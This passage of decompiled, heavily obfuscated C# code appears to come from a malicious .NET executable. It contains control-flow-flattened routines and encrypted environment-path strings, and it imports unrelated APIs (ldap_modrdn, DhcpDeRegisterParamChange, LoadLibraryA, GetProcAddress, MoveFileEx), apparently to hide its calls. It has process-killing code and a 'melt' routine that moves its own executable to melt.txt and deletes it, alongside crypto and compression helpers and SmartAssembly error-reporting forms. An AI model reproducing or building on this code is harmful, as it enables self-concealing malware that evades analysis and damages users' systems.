					string string_2 = "GSDGSDGSDGSD";
					ldap_modrdn(ref class12_, ref string_, ref string_2);
					Process.GetProcessById((int)struct0_0.uint_0).Kill();
					bool bool_ = true;
					GetObjectA(15324234L, 21452142152132L, ref bool_);
					Process.GetCurrentProcess().Kill();
					return;
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
					return;
				}
			}
			throw new Exception();
		}
	}

	static bool smethod_98(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.bool_0;
	}

	static object smethod_99(Class44 class44_0)
	{
		return class44_0.object_0;
	}

	static void smethod_100(Class26.Class35 class35_0)
	{
		if (class35_0.int_4 >= 65274)
		{
			Class17.smethod_190(class35_0);
		}
		while (class35_0.int_5 < 262 && class35_0.int_7 < class35_0.int_8)
		{
			int num = 65536 - class35_0.int_5 - class35_0.int_4;
			if (num > class35_0.int_8 - class35_0.int_7)
			{
				num = class35_0.int_8 - class35_0.int_7;
			}
			Array.Copy(class35_0.byte_1, class35_0.int_7, class35_0.byte_0, class35_0.int_4 + class35_0.int_5, num);
			class35_0.int_7 += num;
			class35_0.int_6 += num;
			class35_0.int_5 += num;
		}
		if (class35_0.int_5 >= 3)
		{
			Class17.smethod_131(class35_0);
		}
	}

	static bool smethod_101()
	{
		try
		{
			return GetSystemMetrics(89) != 0;
		}
		catch
		{
			return false;
		}
	}

	static void smethod_102(Class26.Class36 class36_0)
	{
		if (class36_0.int_2 > 0)
		{
			while (true)
			{
				class36_0.byte_0[class36_0.int_1++] = (byte)class36_0.uint_0;
				if (class36_0.int_2 <= 8)
				{
					break;
				}
				if (!oLMEnfKBTsIqRDPCqp())
				{
					switch (3)
					{
					case 0:
					case 2:
						break;
					case 1:
					case 3:
						goto IL_0061;
					default:
						goto end_IL_0036;
					case 5:
						goto IL_0089;
					}
					continue;
				}
				goto IL_0061;
				IL_0061:
				class36_0.byte_0[class36_0.int_1++] = (byte)(class36_0.uint_0 >> 8);
				break;
				continue;
				end_IL_0036:
				break;
			}
		}
		class36_0.uint_0 = 0u;
		goto IL_0089;
		IL_0089:
		class36_0.int_2 = 0;
	}

	static int smethod_103(Class26.Class28 class28_0)
	{
		return class28_0.int_1 - class28_0.int_0 + (class28_0.int_2 >> 3);
	}

	static ICryptoTransform smethod_104(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	static int smethod_105(Class26.Class36 class36_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class36_0.int_2 >= 8)
		{
			goto IL_005f;
		}
		goto IL_009a;
		IL_009a:
		if (int_1 <= class36_0.int_1 - class36_0.int_0)
		{
			Array.Copy(class36_0.byte_0, class36_0.int_0, byte_0, int_0, int_1);
			while (true)
			{
				class36_0.int_0 += int_1;
				if (LDM65EyL5AHhD5120V())
				{
					switch (6)
					{
					case 3:
					case 4:
						break;
					case 1:
						goto IL_005f;
					case 0:
						goto IL_00b2;
					default:
						goto end_IL_0022;
					case 6:
						goto IL_00e3;
					}
					continue;
				}
				break;
				continue;
				end_IL_0022:
				break;
			}
			goto IL_00c1;
		}
		goto IL_00b2;
		IL_00b2:
		int_1 = class36_0.int_1 - class36_0.int_0;
		goto IL_00c1;
		IL_00c1:
		Array.Copy(class36_0.byte_0, class36_0.int_0, byte_0, int_0, int_1);
		class36_0.int_0 = 0;
		class36_0.int_1 = 0;
		goto IL_00e3;
		IL_00e3:
		return int_1;
		IL_005f:
		class36_0.byte_0[class36_0.int_1++] = (byte)class36_0.uint_0;
		class36_0.uint_0 >>= 8;
		class36_0.int_2 -= 8;
		goto IL_009a;
	}

	static void smethod_106(bool bool_0, EventArgs2 eventArgs2_0)
	{
		eventArgs2_0.bool_0 = bool_0;
	}

	static Icon smethod_107(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".ico");
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_108(Class48 class48_0)
	{
		if (class48_0 != null)
		{
			Class48.class48_0 = class48_0;
			AppDomain.CurrentDomain.UnhandledException += class48_0.method_1;
			Application.add_ThreadException((ThreadExceptionEventHandler)class48_0.method_0);
		}
	}

	static void smethod_109(Class39 class39_0, Delegate14 delegate14_0)
	{
		Delegate14 delegate2 = default(Delegate14);
		Delegate14 value = default(Delegate14);
		while (true)
		{
			Delegate14 @delegate = class39_0.delegate14_0;
			if (LDM65EyL5AHhD5120V())
			{
				switch (5)
				{
				case 1:
					break;
				case 5:
					goto IL_003a;
				default:
					goto IL_004b;
				case 0:
				case 2:
					goto IL_0051;
				case 6:
					return;
				}
				continue;
			}
			goto IL_0051;
			IL_003a:
			delegate2 = @delegate;
			value = (Delegate14)Delegate.Combine(delegate2, delegate14_0);
			goto IL_0051;
			IL_0051:
			@delegate = Interlocked.CompareExchange(ref class39_0.delegate14_0, value, delegate2);
			goto IL_004b;
			IL_004b:
			if ((object)@delegate == delegate2)
			{
				break;
			}
			goto IL_003a;
		}
	}

	static void smethod_110(int int_0, byte[] byte_0, Class26.Class36 class36_0, int int_1)
	{
		Array.Copy(byte_0, int_1, class36_0.byte_0, class36_0.int_1, int_0);
		class36_0.int_1 += int_0;
	}

	static int smethod_111(Class26.Stream0 stream0_0)
	{
		return Class17.smethod_70(stream0_0) | (Class17.smethod_70(stream0_0) << 16);
	}

	static void smethod_112()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		object executablePath = default(object);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 301:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0056;
						case 5:
							goto IL_005f;
						case 6:
							goto IL_0064;
						case 7:
							goto IL_008f;
						case 8:
						case 9:
							goto IL_0094;
						case 12:
							goto IL_00a0;
						case 13:
							goto IL_00a4;
						case 14:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 11:
						case 15:
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00a4:
					num = 13;
					File.Delete(text + "melt.txt");
					break;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text = "" + Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_0056;
					IL_0056:
					num = 4;
					executablePath = Application.get_ExecutablePath();
					goto IL_005f;
					IL_005f:
					num = 5;
					flag = false;
					goto IL_0064;
					IL_0064:
					num = 6;
					if (Operators.ConditionalCompareObjectEqual(executablePath, (object)(text + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==")), false))
					{
						goto IL_008f;
					}
					goto IL_0094;
					IL_008f:
					num = 7;
					flag = true;
					goto IL_0094;
					IL_0094:
					num = 9;
					if (flag)
					{
						goto end_IL_0000_3;
					}
					goto IL_00a0;
					IL_00a0:
					num = 12;
					goto IL_00a4;
					end_IL_0000_2:
					break;
				}
				num = 14;
				File.Move(Application.get_ExecutablePath(), text + "melt.txt");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 301;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_113(Form1 form1_0)
	{
		//IL_02d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02de: Expected O, but got Unknown
		//IL_0302: Unknown result type (might be due to invalid IL or missing references)
		//IL_030c: Expected O, but got Unknown
		while (true)
		{
			form1_0.button_1 = new Button();
			while (true)
			{
				form1_0.button_0 = new Button();
				form1_0.control1_0 = new Control1();
				form1_0.class47_0 = new Class47();
				form1_0.control2_0 = new Control2();
				while (true)
				{
					((Control)form1_0).SuspendLayout();
					((Control)form1_0.button_1).set_Anchor((AnchorStyles)10);
					((ButtonBase)form1_0.button_1).set_FlatStyle((FlatStyle)3);
					((Control)form1_0.button_1).set_Location(new Point(308, 188));
					((Control)form1_0.button_1).set_Name("quitButton");
					while (true)
					{
						((Control)form1_0.button_1).set_Size(new Size(100, 24));
						while (true)
						{
							((Control)form1_0.button_1).set_TabIndex(0);
							while (true)
							{
								((Control)form1_0.button_1).set_Text("&Quit");
								((Control)form1_0.button_1).add_Click((EventHandler)form1_0.method_1);
								((Control)form1_0.button_0).set_Anchor((AnchorStyles)10);
								((ButtonBase)form1_0.button_0).set_FlatStyle((FlatStyle)3);
								((Control)form1_0.button_0).set_Location(new Point(202, 188));
								((Control)form1_0.button_0).set_Name("continueButton");
								((Control)form1_0.button_0).set_Size(new Size(100, 24));
								while (true)
								{
									((Control)form1_0.button_0).set_TabIndex(1);
									((Control)form1_0.button_0).set_Text("&Continue");
									while (true)
									{
										((Control)form1_0.button_0).add_Click((EventHandler)form1_0.method_0);
										((Control)form1_0.control1_0).set_BackColor(Color.FromArgb(36, 96, 179));
										while (true)
										{
											((Control)form1_0.control1_0).set_Dock((DockStyle)1);
											while (true)
											{
												((Control)form1_0.control1_0).set_ForeColor(Color.White);
												Class17.smethod_85(form1_0.control1_0, Enum2.const_2);
												Class17.smethod_22(form1_0.control1_0, (Image)null);
												((Control)form1_0.control1_0).set_Location(new Point(0, 0));
												((Control)form1_0.control1_0).set_Name("headerControl1");
												((Control)form1_0.control1_0).set_Size(new Size(418, 58));
												((Control)form1_0.control1_0).set_TabIndex(7);
												((Control)form1_0.control1_0).set_TabStop(false);
												((Control)form1_0.control1_0).set_Text("%AppName% attempted to perform an operation not allowed by the security policy.");
												((Control)form1_0.class47_0).set_Anchor((AnchorStyles)13);
												((Label)form1_0.class47_0).set_FlatStyle((FlatStyle)3);
												while (true)
												{
													IL_00ac:
													((Control)form1_0.class47_0).set_Location(new Point(20, 72));
													((Control)form1_0.class47_0).set_Name("errorMessage");
													while (true)
													{
														((Control)form1_0.class47_0).set_Size(new Size(382, 13));
														((Control)form1_0.class47_0).set_TabIndex(14);
														((Control)form1_0.class47_0).set_Text("errorMessage");
														((Label)form1_0.class47_0).set_UseMnemonic(false);
														if (!LDM65EyL5AHhD5120V())
														{
															break;
														}
														switch (8)
														{
														case 7:
															break;
														case 16:
															goto IL_00ac;
														default:
															goto end_IL_0006;
														case 9:
															goto end_IL_00d6;
														case 13:
															goto end_IL_017d;
														case 17:
															goto end_IL_018e;
														case 0:
															goto end_IL_01c0;
														case 4:
															goto end_IL_01de;
														case 11:
															goto end_IL_0261;
														case 2:
														case 6:
															goto end_IL_0272;
														case 5:
															goto end_IL_0288;
														case 3:
															goto end_IL_02d3;
														case 8:
														case 12:
															((Control)form1_0.control2_0).set_Anchor((AnchorStyles)6);
															((Control)form1_0.control2_0).set_Cursor(Cursors.get_Hand());
															((Control)form1_0.control2_0).set_Location(new Point(6, 186));
															((Control)form1_0.control2_0).set_Name("poweredBy");
															((Control)form1_0.control2_0).set_Size(new Size(120, 32));
															((Control)form1_0.control2_0).set_TabIndex(15);
															((Control)form1_0.control2_0).set_TabStop(false);
															((Control)form1_0.control2_0).set_Text("poweredBy1");
															((Form)form1_0).set_AutoScaleBaseSize(new Size(5, 13));
															((Control)form1_0).set_BackColor(SystemColors.Window);
															((Form)form1_0).set_ClientSize(new Size(418, 224));
															((Form)form1_0).set_ControlBox(false);
															((Control)form1_0).get_Controls().Add((Control)(object)form1_0.button_0);
															((Control)form1_0).get_Controls().Add((Control)(object)form1_0.button_1);
															((Control)form1_0).get_Controls().Add((Control)(object)form1_0.control1_0);
															((Control)form1_0).get_Controls().Add((Control)(object)form1_0.class47_0);
															goto case 14;
														case 14:
															((Control)form1_0).get_Controls().Add((Control)(object)form1_0.control2_0);
															((Form)form1_0).set_FormBorderStyle((FormBorderStyle)1);
															((Form)form1_0).set_MaximizeBox(false);
															((Form)form1_0).set_MinimizeBox(false);
															goto case 10;
														case 10:
															((Control)form1_0).set_Name("SecurityExceptionForm");
															goto case 1;
														case 1:
															((Form)form1_0).set_ShowInTaskbar(false);
															((Form)form1_0).set_StartPosition((FormStartPosition)1);
															((Control)form1_0).set_Text("%AppName%");
															goto case 18;
														case 18:
															((Control)form1_0).ResumeLayout(false);
															return;
														case 19:
															return;
														}
														continue;
														end_IL_0006:
														break;
													}
													break;
												}
												continue;
												end_IL_00d6:
												break;
											}
											continue;
											end_IL_017d:
											break;
										}
										continue;
										end_IL_018e:
										break;
									}
									continue;
									end_IL_01c0:
									break;
								}
								continue;
								end_IL_01de:
								break;
							}
							continue;
							end_IL_0261:
							break;
						}
						continue;
						end_IL_0272:
						break;
					}
					continue;
					end_IL_0288:
					break;
				}
				continue;
				end_IL_02d3:
				break;
			}
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	static Exception smethod_114(EventArgs0 eventArgs0_0)
	{
		return eventArgs0_0.exception_0;
	}

	static byte[] smethod_115(byte[] byte_0)
	{
		return Class17.smethod_145((byte[])null, (byte[])null, byte_0, 1);
	}

	static bool smethod_116(Class26.Class36 class36_0)
	{
		return class36_0.int_1 == 0;
	}

	static void smethod_117(string string_0, EventArgs1 eventArgs1_0, string string_1)
	{
		Class17.smethod_185(string_1, eventArgs1_0.class40_0, (object)string_0);
	}

	static int smethod_118(Class26.Class30 class30_0, Class26.Class28 class28_0)
	{
		int num;
		int num2;
		if ((num = Class17.smethod_63(class28_0, 9)) >= 0)
		{
			if ((num2 = class30_0.short_0[num]) >= 0)
			{
				Class17.smethod_167(class28_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class17.smethod_63(class28_0, int_)) >= 0)
			{
				num2 = class30_0.short_0[num3 | (num >> 9)];
				Class17.smethod_167(class28_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num4 = Class17.smethod_175(class28_0);
			num = Class17.smethod_63(class28_0, num4);
			num2 = class30_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= num4)
			{
				Class17.smethod_167(class28_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int num5 = Class17.smethod_175(class28_0);
		num = Class17.smethod_63(class28_0, num5);
		num2 = class30_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= num5)
		{
			Class17.smethod_167(class28_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static int smethod_119(Class26.Class28 class28_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (true)
		{
			if (class28_0.int_2 > 0 && int_1 > 0)
			{
				byte_0[int_0++] = (byte)class28_0.uint_0;
				int num2 = 5;
				if (!oLMEnfKBTsIqRDPCqp())
				{
				}
				while (true)
				{
					switch (num2)
					{
					default:
						num2 = 6;
						if (!oLMEnfKBTsIqRDPCqp())
						{
						}
						continue;
					case 5:
						break;
					case 1:
					case 3:
						goto IL_008c;
					case 0:
					case 2:
						goto IL_00bc;
					case 6:
						goto IL_00db;
					case 4:
						goto IL_00ff;
					case 7:
						goto end_IL_0080;
					}
					break;
				}
				class28_0.uint_0 >>= 8;
				class28_0.int_2 -= 8;
				int_1--;
				num++;
				continue;
			}
			goto IL_008c;
			IL_008c:
			if (int_1 == 0)
			{
				return num;
			}
			int num3 = class28_0.int_1 - class28_0.int_0;
			if (int_1 > num3)
			{
				int_1 = num3;
			}
			Array.Copy(class28_0.byte_0, class28_0.int_0, byte_0, int_0, int_1);
			goto IL_00bc;
			IL_00db:
			class28_0.uint_0 = class28_0.byte_0[class28_0.int_0++] & 0xFFu;
			goto IL_00ff;
			IL_00bc:
			class28_0.int_0 += int_1;
			if (((class28_0.int_0 - class28_0.int_1) & 1) == 0)
			{
				break;
			}
			goto IL_00db;
			IL_00ff:
			class28_0.int_2 = 8;
			break;
			continue;
			end_IL_0080:
			break;
		}
		return num + int_1;
	}

	static short smethod_120(int int_0)
	{
		return (short)((Class26.Class33.byte_0[int_0 & 0xF] << 12) | (Class26.Class33.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class26.Class33.byte_0[(int_0 >> 8) & 0xF] << 4) | Class26.Class33.byte_0[int_0 >> 12]);
	}

	static string smethod_121(string string_0, Form0 form0_0)
	{
		string_0 = string_0.Replace("%AppName%", "vf");
		string_0 = string_0.Replace("%CompanyName%", "fbff");
		return string_0;
	}

	static bool smethod_122(Class26.Class27 class27_0)
	{
		int num = Class17.smethod_43(class27_0.class29_0);
		bool result = default(bool);
		int num3 = default(int);
		while (num >= 258)
		{
			int num2;
			switch (class27_0.int_4)
			{
			case 7:
				while (((num2 = Class17.smethod_118(class27_0.class30_0, class27_0.class28_0)) & -256) == 0)
				{
					Class17.smethod_61(class27_0.class29_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				while (true)
				{
					if (num2 >= 257)
					{
						class27_0.int_6 = Class26.Class27.int_0[num2 - 257];
						class27_0.int_5 = Class26.Class27.int_1[num2 - 257];
						if (LDM65EyL5AHhD5120V())
						{
							switch (4)
							{
							case 11:
								continue;
							case 4:
								goto IL_00f2;
							case 9:
								goto IL_00fb;
							case 1:
								goto IL_012e;
							case 8:
								goto IL_0145;
							case 10:
								goto IL_01c1;
							case 0:
							case 3:
							case 7:
								goto end_IL_00df;
							case 2:
								goto IL_0212;
							case 12:
								goto end_IL_001d;
							}
							return result;
						}
						break;
					}
					if (num2 < 0)
					{
						return false;
					}
					class27_0.class30_1 = null;
					class27_0.class30_0 = null;
					class27_0.int_4 = 2;
					goto IL_0212;
					IL_0212:
					return true;
					continue;
					end_IL_00df:
					break;
				}
				continue;
			case 8:
				goto IL_00f2;
			case 9:
				goto IL_0145;
			case 10:
				if (class27_0.int_5 > 0)
				{
					class27_0.int_4 = 10;
					int num4 = Class17.smethod_63(class27_0.class28_0, class27_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class17.smethod_167(class27_0.class28_0, class27_0.int_5);
					class27_0.int_7 += num4;
				}
				goto IL_01c1;
			default:
				continue;
				IL_0145:
				num2 = Class17.smethod_118(class27_0.class30_1, class27_0.class28_0);
				if (num2 >= 0)
				{
					class27_0.int_7 = Class26.Class27.int_2[num2];
					class27_0.int_5 = Class26.Class27.int_3[num2];
					goto case 10;
				}
				return false;
				IL_00f2:
				if (class27_0.int_5 > 0)
				{
					goto IL_00fb;
				}
				goto IL_013d;
				IL_00fb:
				class27_0.int_4 = 8;
				num3 = Class17.smethod_63(class27_0.class28_0, class27_0.int_5);
				if (num3 >= 0)
				{
					Class17.smethod_167(class27_0.class28_0, class27_0.int_5);
					goto IL_012e;
				}
				return false;
				IL_01c1:
				Class17.smethod_26(class27_0.class29_0, class27_0.int_6, class27_0.int_7);
				num -= class27_0.int_6;
				class27_0.int_4 = 7;
				continue;
				IL_012e:
				class27_0.int_6 += num3;
				goto IL_013d;
				IL_013d:
				class27_0.int_4 = 9;
				goto IL_0145;
				end_IL_001d:
				break;
			}
			break;
		}
		return true;
	}

	static ICryptoTransform smethod_123(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	static bool smethod_124(Class40 class40_0, string string_0)
	{
		try
		{
			byte[] byte_ = class40_0.method_4();
			byte[] byte_2;
			try
			{
				byte_2 = Class17.smethod_115(byte_);
			}
			catch
			{
				byte_2 = null;
			}
			byte[] array = Class17.smethod_146(byte_2, "<RSAKeyValue><Modulus>vk4U+ART2CCiIwE2OAD56HoAhfMyvUmWHDncCzsfnTSmz8kgFbMzuLesWECj9TGklqBbDMr0WIWzdUXH67aXGqlDIl2LPR7OOiOpFeenDkfXSiy9F3AQCmRfcGF41opFQCxLvq12wzOzzJ+h3WVHvcKfp55vReF+i861yR2ool0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes("{F10BA855-5D50-46A2-B1AD-DE0A2F07B75F}");
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	[DllImport("kernel32")]
	internal static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static bool smethod_125(Class26.Class35 class35_0, int int_0)
	{
		int num = 128;
		int num2 = 128;
		short[] short_ = class35_0.short_1;
		int int_ = class35_0.int_4;
		int num3 = class35_0.int_4 + class35_0.int_2;
		int num4 = Math.Max(class35_0.int_2, 2);
		int num5 = Math.Max(class35_0.int_4 - 32506, 0);
		int num6 = class35_0.int_4 + 258 - 1;
		byte b = class35_0.byte_0[num3 - 1];
		byte b2 = class35_0.byte_0[num3];
		if (num4 >= 8)
		{
			num >>= 2;
		}
		if (num2 > class35_0.int_5)
		{
			num2 = class35_0.int_5;
		}
		do
		{
			if (class35_0.byte_0[int_0 + num4] != b2 || class35_0.byte_0[int_0 + num4 - 1] != b || class35_0.byte_0[int_0] != class35_0.byte_0[int_] || class35_0.byte_0[int_0 + 1] != class35_0.byte_0[int_ + 1])
			{
				continue;
			}
			int num7 = int_0 + 2;
			int_ += 2;
			while (class35_0.byte_0[++int_] == class35_0.byte_0[++num7] && class35_0.byte_0[++int_] == class35_0.byte_0[++num7] && class35_0.byte_0[++int_] == class35_0.byte_0[++num7] && class35_0.byte_0[++int_] == class35_0.byte_0[++num7] && class35_0.byte_0[++int_] == class35_0.byte_0[++num7] && class35_0.byte_0[++int_] == class35_0.byte_0[++num7] && class35_0.byte_0[++int_] == class35_0.byte_0[++num7] && class35_0.byte_0[++int_] == class35_0.byte_0[++num7] && int_ < num6)
			{
			}
			if (int_ > num3)
			{
				class35_0.int_1 = int_0;
				num3 = int_;
				num4 = int_ - class35_0.int_4;
				if (num4 >= num2)
				{
					break;
				}
				b = class35_0.byte_0[num3 - 1];
				b2 = class35_0.byte_0[num3];
			}
			int_ = class35_0.int_4;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > num5 && --num != 0);
		class35_0.int_2 = Math.Min(num4, class35_0.int_5);
		return class35_0.int_2 >= 3;
	}

	[DllImport("kernel32.dll")]
	internal static extern short GetVersionEx(ref Class51.Struct16 struct16_0);

	static bool smethod_126()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Class17.smethod_108((Class48)new Class49());
			return true;
		}
		catch (SecurityException)
		{
			try
			{
				Application.EnableVisualStyles();
				string string_ = string.Format("{0} cannot initialize itself because some permissions are not granted.\n\nYou probably try to launch {0} in a partial-trust situation. It's usually the case when the application is hosted on a network share.\n\nYou need to run {0} in full-trust, or at least grant it the UnmanagedCode security permission.\n\nTo grant this application the required permission, contact your system administrator, or use the Microsoft .NET Framework Configuration tool.", "vf");
				Form1 form = new Form1(new EventArgs2(string_, bool_3: false));
				((Form)form).set_ShowInTaskbar(true);
				((Form)form).ShowDialog();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString(), string.Format("{0} Fatal Error", "vf"), (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			return false;
		}
	}

	static void smethod_127(Class26.Class29 class29_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class29_0.byte_0[class29_0.int_0++] = class29_0.byte_0[int_0++];
			class29_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static void smethod_128(Exception exception_0, object[] object_0)
	{
		int int_ = -1;
		int int_2 = -1;
		int num = 0;
		StackTrace stackTrace = new StackTrace(exception_0);
		try
		{
			if (exception_0.StackTrace != null)
			{
				string[] array = exception_0.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text.Length > 0)
					{
						num++;
					}
				}
			}
		}
		catch
		{
			num = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				int_ = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				int_2 = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(int_, object_0, int_2, num);
			LinkedList<object> linkedList;
			while (true)
			{
				if (exception_0.Data.Contains("SmartStackFrames"))
				{
					linkedList = (LinkedList<object>)exception_0.Data["SmartStackFrames"];
					if (!oLMEnfKBTsIqRDPCqp())
					{
						switch (5)
						{
						case 0:
						case 2:
							break;
						case 1:
						case 3:
							goto IL_010c;
						default:
							goto IL_0113;
						case 5:
							goto end_IL_00f5;
						}
						continue;
					}
					break;
				}
				goto IL_010c;
				IL_010c:
				linkedList = new LinkedList<object>();
				goto IL_0113;
				IL_0113:
				exception_0.Data["SmartStackFrames"] = linkedList;
				break;
				continue;
				end_IL_00f5:
				break;
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static int smethod_129(Class26.Class33.Class34 class34_0)
	{
		int num = 0;
		for (int i = 0; i < class34_0.short_0.Length; i++)
		{
			num += class34_0.short_0[i] * class34_0.byte_0[i];
		}
		return num;
	}

	[DllImport("DHCPCSVC.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long DhcpDeRegisterParamChange(long long_0, [MarshalAs(UnmanagedType.AnsiBStr)] ref string string_0);

	static int smethod_130(Class26.Class32 class32_0, byte[] byte_0)
	{
		int num = 0;
		int num2 = byte_0.Length;
		int result = default(int);
		while (true)
		{
			int num3 = num2;
			while (true)
			{
				int num4 = Class17.smethod_105(class32_0.class36_0, byte_0, num, num2);
				num += num4;
				class32_0.long_0 += num4;
				num2 -= num4;
				if (num2 != 0 && class32_0.int_0 != 30)
				{
					while (true)
					{
						Class26.Class35 class35_ = class32_0.class35_0;
						bool bool_ = (class32_0.int_0 & 4) != 0;
						if (Class17.smethod_193((class32_0.int_0 & 8) != 0, class35_, bool_))
						{
							break;
						}
						while (true)
						{
							IL_009b:
							if (class32_0.int_0 != 16)
							{
								if (class32_0.int_0 == 20)
								{
									int num5 = 8 + (-Class17.smethod_84(class32_0.class36_0) & 7);
									while (true)
									{
										if (num5 > 0)
										{
											Class17.smethod_174(class32_0.class36_0, 2, 10);
										}
										else
										{
											class32_0.int_0 = 16;
											if (!LDM65EyL5AHhD5120V())
											{
												break;
											}
											switch (1)
											{
											case 6:
												goto IL_009b;
											case 3:
												goto end_IL_009b;
											case 2:
												goto end_IL_0095;
											case 1:
											case 5:
											case 9:
												goto end_IL_00ad;
											case 0:
											case 8:
												goto end_IL_00fe;
											case 4:
												return result;
											}
										}
										num5 -= 10;
										continue;
										end_IL_0095:
										break;
									}
								}
								else if (class32_0.int_0 != 28)
								{
									goto end_IL_00ad;
								}
								Class17.smethod_102(class32_0.class36_0);
								class32_0.int_0 = 30;
								goto end_IL_00ad;
							}
							return num3 - num2;
							continue;
							end_IL_009b:
							break;
						}
						continue;
						end_IL_00ad:
						break;
					}
					continue;
				}
				return num3 - num2;
				continue;
				end_IL_00fe:
				break;
			}
		}
	}

	static void smethod_131(Class26.Class35 class35_0)
	{
		class35_0.int_0 = (class35_0.byte_0[class35_0.int_4] << 5) ^ class35_0.byte_0[class35_0.int_4 + 1];
	}

	static void smethod_132(Class26.Class32 class32_0)
	{
		class32_0.int_0 |= 12;
	}

	static bool smethod_133(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_3;
	}

	static void smethod_134(int int_0, Class26.Stream0 stream0_0)
	{
		Class17.smethod_14(stream0_0, int_0);
		Class17.smethod_14(stream0_0, int_0 >> 16);
	}

	static int smethod_135(Class40 class40_0, string string_0)
	{
		try
		{
			bool flag = class40_0.char_0[0] == '\u0001';
			int num2 = default(int);
			int i = default(int);
			char c = default(char);
			bool flag2 = default(bool);
			while (string_0 != null)
			{
				while (string_0.Length != 0 && (!flag || string_0.Length <= 4) && (flag || string_0[0] == '#'))
				{
					int num = 0;
					if (LDM65EyL5AHhD5120V())
					{
						switch (7)
						{
						case 1:
